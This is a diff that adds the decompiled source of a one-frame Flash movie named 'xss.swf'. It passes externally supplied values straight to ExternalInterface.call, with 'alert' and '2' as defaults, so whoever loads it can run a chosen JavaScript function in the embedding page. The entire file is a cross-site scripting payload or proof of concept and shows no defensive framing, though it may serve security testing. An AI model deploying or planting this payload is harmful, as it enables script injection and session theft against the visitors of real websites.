@@ -1,0 +1,9 @@
+movie 'tmp/xss.swf' {
+// flash 8, total frames: 1, frame rate: 12 fps, 550x400 px, compressed
+
+  frame 1 {
+    a = a ? a : 'alert';
+    b = b ? b : '2';
+    flash.external.ExternalInterface.call(a, b);
+  }
+}
